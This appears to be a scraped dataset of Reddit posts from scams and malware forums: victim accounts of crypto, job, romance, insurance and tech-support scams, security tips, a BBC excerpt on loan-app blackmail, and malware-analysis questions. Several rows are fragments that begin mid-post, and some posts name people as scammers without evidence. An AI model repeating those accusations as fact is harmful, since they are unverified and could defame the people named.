Since she passed away, he's been spiraling privately. He was always too busy to really be *online* that much when my mom was alive, but he bought himself a laptop and has been *VERY online* ever since. He's speedrunning every single scam and money trap that most people in my generation learned to watch out for one at a time as we grew up with internet. I luckily stopped him from giving out his SSN to a random on facebook who claimed to be able to help him with state assistance. I only even knew this was happening because I glanced over at his screen as he was typing in his SSN and I flipped.

So much other stuff has happened. But him with the internet has felt like a child with a loaded gun. He recently pulled out over **two thousand dollars** and transferred it across a chain of accounts until it landed in cashapp, where bitcoin was purchased with the money and then said bitcoin was immediately withdrawn. Now, the tricky part is- my dad has always had like splitting blackouts where he'll do things and then have no memory of doing them, especially under stress. My mom's passing triggered this in the extreme. If I'm to take him at his word, and I really have no choice here- he doesn't remember why or how he did any of this. Let alone where or who the money is going to.

Going through his cashapp history, this has been happening in various amounts over the past three years, maybe more. We nearly got evicted this month because rent money disappeared in this fashion.  I covered it myself, but can't always afford to do so. The chain of transfers makes no sense, but he had to be complicit because it starts with a cash withdrawal from his main bank. I firmly believe he's being taken advantage of. I could just step in- wipe his laptop, wipe his phone, disable any compromised services and accounts, but even on his cashapp there's registered devices from other states and some that are altogether ""unknown"". I don't know the extent of how badly things are compromised here, but he's surrendered all his devices to me, and he's consented to having me handle this however I see fit. **I just want to know if I have any grounds to dispute these transfers.**

It's from *bank 1 to paypal*, from *paypal to bank 2*, from *bank 2's debit card to cashapp*, from *cashapp to bitcoin* and then it's immediately withdrawn into one of a few bitcoin wallets. Some are recurring. Others are not. I'm panicking here, there's over ten grand here over the past couple years. And for a family that's living paycheck to paycheck, with help from relatives sometimes- this is catastrophic.",Scams,2889,522,70,1

She said Zelle but I know Cuba doesn’t use Zelle, well that according to my old Cuba co workers. So at first I didn’t think nothing of it. She never asked me for pictures she just wanted money.

1697161333.0,DigitlHaus Job Scam?,"So... been looking for a job lately and have been applying everywhere, got a text from a random +226 area code number wondering if I was still interested in a job. When I said yes I was messaged on WhatsApp and was ""trained"" on this ""job"" which is essentially pressing ""Start Task"" where it ""optimizes"" a bunch of seemingly legitimate but sketchy fake looking items with low quality images. For example look at the price for the Heritage Drawstring Bag, it's $290 USDT. Also that's the other thing, they start you off with $100 USDT and once you complete 45 tasks you can withdraw your money in USDT into your USDT wallet. In this case I was using LBank (as per the trainer's recommendation). Once the funds are in your wallet you can sell it on LBank to a merchant who sends you the USDT equivalent in the funds of your choice in whatever payment method you want. In my case I chose to sell the USDT's in CAD funds and receive the funds via Interac/e-transfer. I did get the funds mind you. The catch is you encounter a ""combo product"" where it will lock 2 products in together and you will have a negative balance (see picture showing -$942.2) and you will have to deposit your own funds to make it 0, when you do, you can ""submit"" the combo products and continue doing your 45 tasks. At the end you can make a withdrawal again. Here's where it gets sketchy, when they pay you the ""salary"" Day 2, 4, 15, 30, etc, 2 minutes after you ""randomly"" get a combo product and your funds are locked again where you're in a negative balance and you have to deposit more of your money to get it back. My guess is day 30 you get paid $2500 USDT however 2 minutes after, you get a combo product again which locks your funds and you get a negative balance upwards of $9000-10000 and you have to deposit that amount to get your funds + ""profits"" back. However there's gonna be some sort of system issue or something and that's when the scam sets in. The website FAQ says you have to contact customer service if you want to make a withdrawal of $10,000 USDT or more.

I should also indicate that the ""trainer"" who reached out invited me to a WhatsApp group chat where there's 20 or so people, each with low quality pictures of fake people, like influencers and such and they will all ask very monotone almost robotic and scripted messages to one another or in general in the group chat like: ""Hello everyone! Has everyone done their tasks today?"" and things of that nature. They all reply in the same way, with bad English and grammar, putting unnecessary periods at the end of their sentences.

I can provide more context, tell me what you guys think?

She's basically the perfect victim for a romance scammer, and for the last several weeks she's been corresponding with a painfully obvious romance scammer. This man claims to be a widower living in the Lower 48 about 1,000 miles away from her who is a wealthy engineer that works all over the world; his latest job was in Dubai and he just hit her with the first request for money because the bank hasn't released his funds and he's stuck in Dubai with no money.


This is obviously 10,000% a textbook romance scam with no chance whatsoever of being legit, but when she turned him down he got pushy and sent her a photo of the ID of the man he's pretending to be. The scammer knows she's too remote to check it out, but I happen to be 15 minutes away from the address. I've looked in to him, and the guy exists, lives there, has a digital footprint here (nothing about being an engineer or widower), and family that's active on Facebook.

He seemed very knowledgable and assisted me in picking a health insurance plan called ""First Health"" which was supposed to be owned by Aetna. I told them what I needed and I signed up for the insurance for $553.00, which was charged to my credit card. I felt good about my decision and received a membership card in the mail a couple of weeks later. Once I received the card, however, my heart sank. First of all, there were six different company logos on it: First Health Network, ABC + Advantage 3, Socios Buenos LP, Pro Act, HMA, and MutliPlan. Then, on the bottom of the card in small writing, it said ""Benefit Plans are not sold or insured by First Health or its associates."" I then spoke to the hospital financial services department where I was supposed to get surgery and they told me that the insurance I had purchased didn't have any of the benefits that I was promised and that I had was paying for basically no coverage. Upset, I called the broker up and was sent to a call center. I asked for the ""Alex"" who I had originally spoken to. I was transferred and, after recognizing his voice I asked him about the discrepancy between what was promised in the plan and the reality of the ""insurance"" I was given. He proceeded to tell me that his name was not Alex \*\*\*\*, but another Alex, and that Alex \*\*\*\* was his co-worker. I told him I wanted to speak to the other Alex. I was put on ""hold"" (no hold music) and out of frustration, I eventually hung up. I was called back by ""Alex"" and I told him I wanted to speak to Alex \*\*\*\*. I was transferred again to a man who also referred to himself as  the previous Alex. I asked him what the name of the previous person was and he said it was Jordan. I asked him what the name of the company they work for is. He told me it's called ""Stoic Insurance Group."" I looked up Stoic Insurance Group - but the link goes to various shell companies that sell fraudulent insurance. Luckily, I made the initial payment on my credit card and not my debit card and I immediately called my bank, changed my credit card number and disputed the initial charge - but there are plenty of stories online of people that have been scammed by ""Socios Buenos LP.""",Scams,2459,462,62,1
1697154042.0,Telus Scam?,"I found out about this AFTER it happened. My mom may have gotten scammed. My mom went online to find the Telus support number and got a number that we later found was not Telus' main line but some other 877 number. The techsupport/scammer got her to go to a website that would let him access her computer to check for security issues. While he was on her computer the mouse was moving by itself she said and then the screen went black so he could check something. Upon review of her browser history, the scammer went to official Telus websites. At this point for whatever reason my mom just said she wanted to talk to me before committing to any new software and he ended the call with her and stopped accessing her computer.

Did she narrowly avoid some software scam or did he install a trojan/backdoor on her computer?

So far I instructed her to change her bank login, update her email password and change her Microsoft account password. The Geek Squad suggested we wipe and reload her OS just in case the scammer made changes to the system. I know it's an abundance of caution but you never know what he was doing behind the scenes.

1697151646.0,PSA: Greenya Safety (Not Safe),"Short version: don’t buy from them.

(Pictures: 1. Contact form not working, taken today, 2. taken today of my “order status”, 3. Screenshot from when I first put the order through)

I was trying to find these particular Nike slides that I had a pair of and loved but could not find again anywhere. Finally found them on this “Greenya Safety” shopping site (Greenyasafety.com). A few questionable aspects, particularly that I couldn’t find any info on the company when I googled them, and the price was lower than other spots, but I decided to take the risk and if it was one of those ones where I never got the package, I would live with the $60 loss; I really wanted those slides. 

Seemed fine when it redirected me to another “secure page” for my payment info, but I was careful to watch my credit card for suspicious charges after that, just in case I needed to report anything to my bank since I was already a little suspicious. I could have sworn I got an email confirmation with the order number but I cannot find it for the life of me anymore, so not sure if that’s sketchy or if I’m just remembering wrong. 

Nothing ever came up, order status never changed, so last week, I decided it was time to use their “contact” form to follow up since a month had gone by, and of course it doesn’t work and keeps giving me an error message. I tried using the contact form at different times, still nothing. I made peace with the outcome; I took a risk and it didn’t work out. I knew that was a potential, and maybe even likely, outcome. 

Today, though, I was contacted by my bank about a suspicious charge on my credit card for over $1000 from a well-known brand. I did not make that charge. At first I didn’t respond to the text I got about it since I dismissed it as a scammer when I didn’t see the charge listed in my banking app, but when I got two calls, I opted to call the credit card line myself from within my banking app to see if it was legit (I wanted to be certain). Turns out it was actually them trying to confirm the charge.

So now my card is cancelled and I’m waiting for a new one in the mail, but I wanted to post about this Greenya Safety, that way if anyone else considering ordering from them googles them like I did, maybe they’ll find this post and learn from my mistake. I don’t know for sure that they are the reason my card was compromised, but I wanted to post about them anyway and this just pushed me to do it sooner than later.

1697149075.0,Construction scam (Canada),"Just looking on advice of what to do in this situation. Please keep the mocking me to a minimum, as I know I'm a dumbass for falling for this shit! I came across a certain contractor for a construction job, let's call him Bob. Bob was referred to me through a woman that I work with, her husband, lets call him John, does concrete, and he referred me to him for my job. Bob was contracted to do a garage building job for me and everything seemed legit, the only thing that I didn't like was that I couldn't find much info online about the business. John and Bob both assured me many times and even sent me some of his previous work with contacts to call for references, which I did. Still I reluctantly agreed to continue with him to draw up quotes and a contract of what was to be completed. The other thing that didn't sit well with me is the 40% down payment for supplies and architectural drawings to be completed, which amounted to about $45,000. But again both Bob and John assured me everything was fine and said all the right things. I proceeded with the bank draft note, and a couple of smaller ($1000-$3000) electronic funds transfers. The relationship seemed okay over the past couple  months. There were delays with different things to do with the city and such, that also seemed reasonable. Bob sent me architectural drawings a little while ago, we revised them, and he has yet to send me the updated ones. For a week or so now all communication with Bob has been nonexistent. I get no answers to my texts, none to my voice messages, etc. I obviously got a really bad feeling about this because when I was calling recently it went straight to voice-mail. I called Bob from a different number, and guess who answers!?!? Fucking BOB!!! As soon as I said who it is, he hung up immediately. I've now called John and spoke to his wife that I work with and of course they claim to know nothing about it and try to place the blame on me. Obviously I have to sue him, but found it insane that the police cant do a damn thing and just say the entire thing is a civil matter, even though he could be scamming others too. How is it different than stealing?!?! In the mean time how can I find out more info on him cause I don't even have a fucking address.

1697147961.0,How to protect yourself as much as possible,"I see a lot of posts about people getting their identity, banking information, credit cards, etc stolen. I used to work for a bank and am pretty aware of all the crap thieves can do to steal your information so I thought I would help people with the stuff they can do to protect themselves. I wrote this on the other post but figure it deserves it’s own post. 

Someone asked if thieves can fake Face ID, I’ve not heard of them being able to fake Face ID yet but they can sim swap, fake your IP, and your cookies session as well. When using those methods it’s pretty hard to fight back and get your money back. For anyone trying to avoid this type of thing it’s important to put multiple layers of protection in place in order to carry out these types of transactions. The reason why people don’t do it is because it makes our own lives a bigger PITA and makes it harder to do things on our own, but it’s worth it to protect yourself. 

A few things you can do: clear your sessions after you login. Go to your banking app and see what sessions you have active and disable them all. Make sure you need to establish a new one every time. 

Set up 2FA (preferably from an authentication app) and realize that no one will ever call or text you asking for this info, if they do it’s a scam. 

Set up sim protection to protect your phone from a sim swap. Also set a password on all your accounts (bank, phone, utility, etc.)in addition to your personal info so that none of your accounts can be accessed by anyone, including employees, without this password even if they have all your identifying information. 

Sign up for credit monitoring, freeze your credit, and set up a password on all bureaus. 

Use a separate number for your banking and personal so if someone looks you up they can’t just guess this is the one you use. 

Use a service that keeps your information out of public record. Deleteme and others will do this. 

Use different email addresses by using iCloud relay for everything so if one gets hacked they don’t have your login information or email for everything. This is a great way to protect your privacy. This also goes for passwords. 

Change your passwords regularly. Don’t use pet names, regular words, etc. 

Use nonsense answers and not real ones for your challenge questions. Example: What city did you meet your spouse in? Food 

Set up transaction alerts for everything over $50.

Don’t allow transfers or transactions over a certain amount to take place without multiple authentication methods. 

Protect your email and other passwords as seriously as you would your banking ones. Email very often is the only thing thieves need to ruin your entire life. Turn on 2fa for this and make sure you change passwords regularly. Also, check for where you are logged in and log out of all devices you don’t need. 

Password protect all phones and devices. 

Don’t enter your password in a public place, use Face ID for this. Thieves watch you and if they steal your phone and have this you’re screwed. 

Use temp card numbers for websites. 

Lock your credit cards when not being used. 

If anyone from your bank calls you asking for information, hang up and call the number on the back of your card before giving any info or talking to them. 

Add your credit cards to Google or Apple wallet, you will get transaction alerts for everything. 

Check your statements every month, even if you didn’t use your card. The only way to fight charges is to catch them in time.",Scams,3487,628,64,1

i always block these numbers but it doesn’t change anything! they always have the same area code, same as my number but not the place i currently live 

today i called back and received a voice mail, which read out a different number with a different area code. it turns out it’s the same phone number attached to all of these, what i assume google numbers. every time i block one they just create more! but it’s the same source 

i’m unsure if any of that helps, but please any advice to get it to stop??? i’m so tired of the constant spam

1697128748.0,Is this a scam? Dynasty Freight Systems email,"So I got an email a few weeks ago advertising for a ""Payment Processing Specialist"" from Ana Isabel at Dynasty Freight Systems. It seems to be a Canadian company based out of Regina, SK. I checked the website, but anyone can make a good looking fake website these days. 

I'm a little suspicious for a few reasons:

1. They emailed me directly and not through a job search website like indeed or linked in. Understandably I do have that email on my resume and my resume is available for viewing on those sites, so it's not hard to understand how they got my email, but I still find it strange they contacted me directly. 

2. I checked linked in and indeed and couldn't find anything for the company or the recruiter that reached out. I would think they would at least have a linked in account if they were a legit company looking to hire staff but I may be wrong.

3. I did a quick Google search of the company name and the word scam, and I saw a link that says the website was marked as suspicious. I also Googled the address of the company and I found a For Rent listing that was posted just 8 days ago. The most recent email was sent to me yesterday.

The third point is pretty convincing that it is in fact a scam, but it doesn't hurt to ask. Had anyone heard about this company? Or does this sound familiar to anyone?

1697128017.0,Not sure if this is leading up to a scam,"A few days ago, I received a random DM on Instagram commenting on a recent post of some scenery I took while traveling. She was asking about the location and said she found my post through google (I don't have any hashtags on the post so this feels like the most sus part). Apart from that though, everything feels legitimate. Her profile looked like a normal profile with a year of post history and there were multiple travel locations, which fit with her saying she loves traveling and that's why she was asking me about it. At first I was expecting a scam so I was on high alert but continued the conversation to see where it was going. She wanted to have a quick video call and I could see she is who her profile shows. After that she wanted to move to WhatsApp and the phone number matches the area she said she lives in.

At this point I saw her profile was in a language I've been learning and we've been chatting a lot in said language to help me practice it. It's only been a few days but there hasn't been much to trigger a scam alert in my head. Does this sound like a scam anyone here has heard of?

Summary of evidence for it being a scam and not being a scam:

Scam:

-Random instagram DM

-Moved to WhatsApp

-Mentioned following crypto/financial trends a couple times (but didn't push that topic further, just said it was among her interests)

Not scam:

-Normal-looking account

-Details are consistent

-Hasn't pushed anything scam-like after a few days

-Video call showed her identity",Scams,1504,275,25,1

1697111947.0,"Beware of Fake Social Media ""Teachers"" Such as Shruti Pangtey Founder & CEO at Digital Empires"," Hey everyone,

Just wanted to share an experience I had and hopefully help others avoid the same pitfalls. I was on the verge of buying a course from this particular individual when I quickly realized I was about to get involved with a ""wanna-be"" teacher. I found her on social media and, half-jokingly, asked, ""Where can I find 66 people to sell content?"" To my surprise, she screenshotted my question and posted it on her Instagram story, shaming me in front of her alleged 80k followers (which I suspect are mostly purchased) and suggested TikTok as the answer.

I kindly asked her to remove my personal details. Instead of respecting my privacy, she blocked me, keeping the content up. Now, any legit social media influencer or course seller knows the drill: either get approval before showcasing someone or, at the very least, hide their details when mentioning them publicly.

I took my grievances to Trust Pilot. She initially responded, saying her ""team"" was on it and there was no issue since everything was in the public domain. But let's be honest here—any professional PR team would prioritize ethical communication and proper English. She later removed her comment and flagged my review as ""illegal"". Now Trust Pilot is on it.

And get this: if you do a deep dive on her LinkedIn, it seems like her ""11 employees"" are just made-up profiles to boost her online presence. Her Instagram? Probably packed with fake followers. And her traction on other platforms is less than impressive.

Honestly, she might be a decent graphic designer, but it seems she's also utilizing something like Chat GPT for content. I have a hunch that she'll flood her Google reviews with more positive ones to counteract any negative feedback like mine.

For those on their digital journeys, especially the newbies: **always vet** who you're learning from. Research is key if you're serious about your growth.

**Stay informed, and protect yourselves.**

This has never happened to me before and terrified me! Whenever I purchase things online I use PayPal, and haven’t ordered anything for ages and couldn’t think of anything else it could relate to or where somebody could have got hold of my card details. 

Luckily the bank reversed the payments straightaway (they’ve now disappeared from the app) and have cancelled my card. They have said they will open an investigation but I doubt I will be updated. I wondered if anybody had the same thing happen to them and how their details had been obtained? I am usually so careful, and as I said it’s the first time anything like this has ever happened to me!

I was asked 245€ other people were asked 1000€. Inconsistent. 

The twist is that in some cases (30% Id say) they actually grant the visa ONLY after you have paid these additional fees. 
If you refuse to pay then you lose 165€ and dont get a visa :) 

Funny enough in their FAQ they mention other websites asking for extra costs and they confirm its a scam. 
I only read in their website after Ive applied and paid initial fee. If I read beforehand I would have known its a scam because the answers in FAQ are ridiculous.

1697093402.0,Remote Car Buyers Claiming to Live Abroad,"I recently posted my car for sale online and since then I've been getting a ton of inquiries from potential buyers who claim to live abroad. They express a strong interest in purchasing the car remotely and importing it to another country.

Almost all of them say they cannot join a video call for some reason. This has raised a red flag for me, and I tend to think that all of these might be scams.

Has anyone else experienced a similar situation or have any insights into this type of scenario? I'd appreciate any advice or tips on how to navigate these inquiries and protect myself from potential scams. What are the usual signs that a remote car sale might be a scam, and how can I ensure a safe and legitimate transaction?

Thanks in advance for your help!

They've already added my friends and followed school and work pages and I'm not sure how to report them or remove them without risk of things being leaked.

Im afraid to report because I'm sure instagram would send them a report notice making it obvious I ""broke"" the deal I have with them, but I don't know how else I can deal with the situation. 

I'm royally screwed cuz now they can contact my school pages and fellow cadets in JROTC whom are full of individuals who has mutual respect but not necessarily knowing anything about each other on a personal level.

Plus with the way they acted I'm pretty sure if I do send them money on Tuesday they'll threaten for more money after that.

1697090785.0,I keep getting text messages that I signed up on a service. What do I do?,"So as of right now, this is the fifth text message I've gotten from an unknown number telling me that I signed up to a service I never used nor known it even existed in the first place.

I asked my dad who has 12 years of experience in software engineering and is currently an IT manager and he said that it's just advertisements. He told me next time don't click on them, and to not respond or report them (I never did anything but look at it). Just ignore them. 

But I'm really confused as to why it's happening so much to me and me only. No one else is getting this, and I'm getting worried. If someone just misspelled the number it surely would have been a one-time thing right? What's going on?

Edit: completely forgot but PetSmart also called me during work right after I got a notification I signed up to one of their dog training services. I never even owned a pet before, let alone a dog. I think that's the fishiest thing about my dad's ""advertisement"" explanation because if it was advertisement, then either other people would've gotten something similar or it would be catered to me (like advertising about dog adoption instead).

Noting the time I received the 6 digit code on that day, I called my phone service provider to ask them what the hell this was about. I requested no 6 digit code from anyone, likewise I spoke to no CS rep named V. I happened to be sleeping when the 6 digit number came in and had not been on the phone or computer at that time. The rep I spoke with said that this was an attempt to hack or compromise my phone but my provider recognized it as such and prevented it. No further details provided, I just said OK and thanks. Of course it is rather absurd that they would also send me a survey about the customer service rep with the initial V who I never spoke to which of course I did not answer. My questions: has anything similar happened to anyone in this group? Could someone I know have attempted this or was it an unknown party? I did someone a favor and put him as an authorized user on my mobile phone account and he screwed me over on reimbursing me for his usage over the course of several months so I kicked him off the account.

Since I’m having lots of work done by various contractors on my home, I answered (lesson learned). Elderly woman asked for my name. I declined to answer and asked for her name. “Rose”. I do know a Rose and she’s elderly (and a bit nutz, but I digress). At that point I shared my [first] name. She went on and on about her phone sometimes doing strange things, as she was trying to call her bank, etc, etc. Then she asked how my knees are doing. WTF? I said, “I think maybe that’s someone else.” She then said “Oh, I have a niece named [my name]. Aren’t you my niece?” Ahem. “No, Im not.” Then she kept talking. Anywho, she clearly didn’t want to get off the phone. I finally told her [for the second time] that I was working…”but have a nice evening.” And I hung up feeling vaguely rude in case she was just a lonely person. 
The phone # traces back to a Robert [last-name blinded to this post for his privacy]. So I look up “Rose [last-name]”. Deceased in 1946. Holy shit! I’ve crossed dimensional time and space!!

I, on the other hand, am quite sure.  I don't want to embarrass him further without your advice - is there any action he can take at this point or is this money just lost?

We went and saw the house yesterday, we loved it and want to pursue it. I should mention, his uncle let us in (supposedly) to view the house but he did not speak a lot of English. The owner says we can rent the house and is asking for us to use TurboTenant to send money. He sent over the lease agreement to be signed via docusign and said the security deposit won’t be due until the 16th, and the pro rated October rent on the 18th ( the day we would be moving in).

https://www.amazon.com/dp/B0BR6HZZ6Z?psc=1&smid=A3I6AOI299KDZJ&ref_=chk_typ_imgToDp

I bought this earlier today after seeing the deal and didn't really think much of it, but then I started thinking...... Why is this so cheap?

After doing some digging it seems like most of the 7000 series cards from Sapphire are being sold by a different seller ""congxinadianzishangwuyouxiangongsi""

They are a new seller but they have thousands of items listed, so I am thinking it's legit, but it also feels far far too good to be true. This is literally on Sapphire's own store and the first thing listed, it's not even listed as a secondary seller.. this is the MAIN seller from sapphire.

So this leads me down 2 lines of thought; either this is some really well executed scam, or the factory is just trying to get rid of a gigantic surplus of these 7900xtx's so they're axing them by dropping their price by half. Still feels too good to be true, but I can't help but feel like there would be no way to pull this off under a seller as big as Sapphire.

I think the rules of this reddit group say I can't post contact info but the email address had the words @ hireweigelbroadcasting in it..... The first name in the email address was a C name but I cant say the name since this forum says No personal info allow.

It was odd that the email came in at 5:36 in the morning. But not necessarily the true sign of a scam because once in a blue moon I work really early as well. But that was **the first red flag**. The email read:

*Dear {redacting my first name}*

*This email serves as a courtesy notification that your resume has been reviewed by the    WEIGEL BROADCASTING CO. HR team and you have been shortlisted for an online interview/job briefing for the position of FREELANCE VIDEO EDITOR at    WEIGEL BROADCASTING CO. We have evaluated your resume and found  your background and qualifications impressive. Hence, we would like to  invite you for a further discussion regarding the job role and your  fitment for it. The goal of this interview is for us to get to know you  better, and for you to ask any questions you may have. We want to make  sure that your goals and ambitions match our company’s culture and  position. Kindly go through the attachment below for information on how  to schedule your interview, Looking forward to hearing back from you  soon!*

*Best Regards*

*(name redacted)*

*HR Director*

*Weigel Broadcasting Co.*

In the body of the email, the words that were capitalized were put in the color green which I **found odd**. I didnt remember applying for this job (**that was the 2nd red flag**) but then again I get so busy with work who knows what I've applied for in the past. But I started to read the PDF they sent. In the PDF it said that they would send equipment. **That was the 3rd red flag.** It's not unheard of but it is kind of rare to tell a freelance you're going to send them equipment when usually you rely on them to provide their own equipment. It said:

    Candidates who are selected for this position will be trained remotely and must be able to work from home in a designated work area with company-provided technology equipment.
    You will be advised on how to receive the following devices:
    Apple iMac Pro (27"" 5K Retina Display; 1TB SSD.)
    MacBook Pro 2021 16” (M1 Max)
    AKG K712 Pro Reference Headphones.
    Sony α7R IV 35 mm full-frame camera with 61.0 MP
    Altwork Workstation

**No seriously, what the hell does a video editor need a ""Sony A7r"" camera for?!** This isnt a shooter/editor job. *(Cause scammers are stoopid)*

Interestingly enough the PDF mentioned a pay rate of $75-$85 an hour which is roughly what I charge my clients so I suspect this scammer did their homework on me, or has had some kind of contact with me before maybe pretending to be a different job posting asking my rate???

After the 3rd red flag I went to linkedin and looked up this person whose name starts with C. Sure enough there was a linkedin profile matching that persons name and job description but that still doesnt mean this job is legit. The emailer could pretend to be the woman on linkedin.

My next task on Linkedin was to connect with other HR people who work at that same company. (You press the connect button on linkedin and they let you send a tiny message to the person you're trying to connect with and in that intro message I asked this HR person if he could help me identify whether or not this is a scam). This HR person accepted my linkedin request and they claim the real C-Named person doesnt even use an email address with the word weigel in it. That's when I knew for sure it was a scam.

I went to the person emailing me (the scammer) and said I dont see anyway to schedule this interview like your paragraph says. And they emailed me back and said ""Kindly send your email address to me, I will add you up myself on Microsoft Teams to proceed with the Interview."" I said you have my email address, it's how you contacted me! Their response: ""If that's your preferred email address I will add you up."" .....17 minutes later ""Check you Microsoft Teams"".

why do I need to go on microsoft teams to schedule the interview? because its a SCAM SCAM SCAM! YOU SHOULD'VE SEEN THE PDF THEY SENT ME. IT LOOKED PRETTY LEGITIMATE (for the most part). Watch out folks. dont trust anyone, ever. Always do your homework. ",Scams,4474,801,93,1

Essentially, the scammers get someone to download an app in order to aply for a cash advance.  That app gives the scammer access to the victim's phone and they do all sort of things with the information:  photoshopping their faces into porn and then sending this to their contacts is a common tactic.

&#x200B;

 Partial transcript:

**A blackmail scam is using instant loan apps to entrap and humiliate people across India and other countries in Asia, Africa, and Latin America. At least 60 Indians have killed themselves after being abused and threatened. A​ BBC undercover investigation has exposed those profiting from this deadly scam in India and China.**

Astha Sinhaa woke up to her aunt's panicked voice on the phone. ""Don't let your mother leave the house.""

Half-asleep, the 17-year-old was terrified to find her mum Bhoomi Sinhaa in the next room, sobbing and frantic.

Here was her funny and fearless mother, a respected Mumbai-based property lawyer, a widow raising her daughter alone, reduced to a frenzied mess.

""She was breaking apart,"" Astha says. A panicked Bhoomi started telling her where all the important documents and contacts were, and seemed desperate to get out of the door.

Astha knew she had to stop her. ""Don't let her out of your sight,"" her aunt had told her. ""Because she will end her life.""

 

Astha knew her mother had been getting some weird calls and that she owed somebody money, but she had no idea that Bhoomi was reeling from months of harassment and psychological torture.

She had fallen victim to a global scam with tentacles in at least 14 countries that uses shame and blackmail to make a profit - destroying lives in the process.

The business model is brutal but simple.

There are many apps that promise hassle-free loans in minutes. Not all of them are predatory. But many - once downloaded - harvest your contacts, photos and ID cards, and use that information later to extort you.

When customers don't repay on time - and sometimes even when they do - they share this information with a call centre where young agents of the gig economy, armed with laptops and phones are trained to harass and humiliate people into repayment.

 

At the end of 2021, Bhoomi had borrowed about 47,000 rupees ($565; £463) from several loan apps while she waited for some work expenses to come through. The money arrived almost immediately but with a big chunk deducted in charges. Seven days later she was due to repay but her expenses still hadn't been paid, so she borrowed from another app and then another. The debt and interest spiralled until she owed about two million rupees ($24,000; £19,655).

Soon the recovery agents started calling. They quickly turned nasty, slamming Bhoomi with insults and abuse. Even when she had paid, they claimed she was lying. They called up to 200 times a day. They knew where she lived, they said, and sent her pictures of a dead body as a warning.

As the abuse escalated they threatened to message all of the 486 contacts in her phone telling them she was a thief and a whore. When they threatened to tarnish her daughter's reputation too, Bhoomi could no longer sleep.

She borrowed from friends, family and more and more apps - 69 in total. At night, she prayed the morning would never come. But without fail at 07:00, her phone would start pinging and buzzing incessantly.

Eventually, Bhoomi had managed to pay back all of the money, but one app in particular - Asan Loan - wouldn't stop calling. Exhausted, she couldn't concentrate at work and started having panic attacks.

One day a colleague called her over to his desk and showed her something on his phone - a naked, pornographic picture of her.

The photo had been crudely photoshopped, Bhoomi's head stuck on someone else's body, but it filled her with disgust and shame. She collapsed by her colleague's desk. It had been sent by Asan Loan to every contact in her phone book. That was when Bhoomi thought of killing herself.

We've seen evidence of scams like this run by various companies all over the world. But in India alone, the BBC has found at least 60 people have killed themselves after being harassed by loan apps.

Most were in their 20s and 30s - a fireman, an award-winning musician, a young mum and dad leaving behind their three- and five-year-old daughters, a grandfather and grandson who got involved in loan apps together. Four were just teenagers.

Most victims are too ashamed to speak about the scam, and the perpetrators have remained, for the most part, anonymous and invisible. After looking for an insider for months, the BBC managed to track down a young man who had worked as a debt recovery agent for call centres working for multiple loan apps.

 

Rohan - not his real name - told us he had been troubled by the abuse he had witnessed. Many customers cried, some threatened to kill themselves, he said. ""It would haunt me all night."" He agreed to help the BBC expose the scam.

He applied for a job in two different call centres - Majesty Legal Services and Callflex Corporation - and spent weeks filming undercover.

His videos captured young agents harassing clients. ""Behave or I will smash you,"" one woman says, swearing. She accuses the customer of incest and, when he hangs up, she starts laughing. Another suggests the client should prostitute his mother to repay the loan.

Rohan recorded over 100 incidents of harassment and abuse, capturing this systematic extortion on camera for the first time.

The worst abuse he witnessed took place at Callflex Corporation, just outside Delhi. Here, agents routinely used obscene language to humiliate and threaten customers. These were not rogue agents going off-script - they were supervised and directed by managers at the call centre, including one called Vishal Chaurasia.

Rohan gained Chaurasia's trust, and together with a journalist posing as an investor, arranged a meeting at which they asked him to explain exactly how the scam works.",Scams,6067,1023,151,1

She clicked the link and was taken to a payment page for KOKOMUSIC where they asked her to transfer a Euro so they could confirm her bank account

Alarm bells should have been ringing by now, but they weren’t and my wife inexplicably fell for this and put in her bank account details including the 3 digit CCV code on the payment page

She called the bank immediately and cancelled her card

A couple of hours later she received a phishing email from KOKOMUSIC saying she had created an account and to cancel and refund the payment to click the link or to open the attachment, cant remember which one.

She clicked the link or opened the pdf (I know I know)

She then told me what had happened and asked should she have clicked the link/opened the doc

She is distraught and has now convinced herself her bank accounts are going to be cleared out and the scammers have access to her phone and every account she has online and are ordering stuff she will have to pay for or monitoring her activity online

When I was messaging with him I was working and on 5 nights row of 4-5 h sleep so my thinking wasn’t clear. I asked him to pay in other ways but he was like I need in this way…. I was in hurry so I didn’t think about it. I lost 200 euros and feel ashamed and stupid for this mistake. There is no fast way to earn money but fast way to spend it. Never trust anyone on internet, never pay anything in bitcoin or other crypto currencies. In the end betting won’t make u rich but will make u addicted to believing u will hit big money easy. Mistake and lesson. There is no fixing bets for regular people, only for 1 or 2 people that know people in high places. Also be careful of recovering scammers, who will prey on u to recover your lost money for u but u need to pay them. Unfortunately I learned about this after I lost money.

After sending him the $1100, I showed him the confirmation screen with the big green check mark showing he got paid, I then loaded the chair up and left. 10 minutes later he calls me and says he never got the payment, I checked my app and it showed I sent him the payment, but then it shows his account send me a payment for $1100 right after.

He kept calling and was polite but was trying to pressure me into either going to the bank tonight to pull out cash for him since he didn’t receive funds or to meet him and give the chair back.

Additionally, some of the Malware written in Golang aren't going to have strings to use as a conditional. The Yara rules I see on GitHub include hash values (which I don't entirely understand, because just changing the filename would defeat this condition. Are they hashing just a portion of the Malware? If so, how is this done?) or certain hex sequences. Can someone point me to some reading material for in-depth Yara rule development?",Malware,853,153,25,1

1693762865.0,Binary Emulation for Malware Analysis,"During my journey into reverse engineering, I stumbled upon a valuable technique: partial binary emulation while dissecting the Mirai IoT Botnet. This malicious software utilized a custom algorithm to obfuscate both its configuration and all strings within it. As the malware executed, it dynamically decrypted these strings through a specific function.  

As I delved deeper into the project, a thought crossed my mind: Could I decode all the obscured strings without having to run the malware itself? Was it possible to isolate and run only the de-obfuscation segment of the binary on all the strings it contained?  

Fortunately, I was in the process of familiarizing myself with a new reverse engineering tool, recommended by a friend, called radare2. What particularly piqued my interest was its fascinating feature known as binary emulation. I decided to put this feature to the test on the aforementioned binary.  

I meticulously documented my project and outlined the process of performing partial binary emulation with radare2, successfully decrypting all of its concealed scripting features.

1687981125.0,No judgment; just a post aimed at users seeking guidance about a potential malware infection.,"Generally - the scope of this sub isn't so much dedicated to techsupport related issues but for more meta and analytical discussion about the subject *of* malware.   
  
That being said, if you're worried about being infected or you'd like help - it's understandable to come here first because it's quite literally in the namesake. Anyway, this post is just a quick glance at your options if you have been infected or suspect you may be.  
  
First, it's important to establish whether or not you were actually infected with a malicious file. Most modern browsers and your actual Operating System (OS) make it difficult for malware to even land on your machine. That's not to say it doesn't happen - but Chrome and Edge will not let you download a malicious file if a virus is detected. If a malicious file lands on your actual OS, your system security will often identify, remove, and alert you immediately.   
  
Again - it's not to say it doesn't happen. But it's less common than just a few years ago.  
  
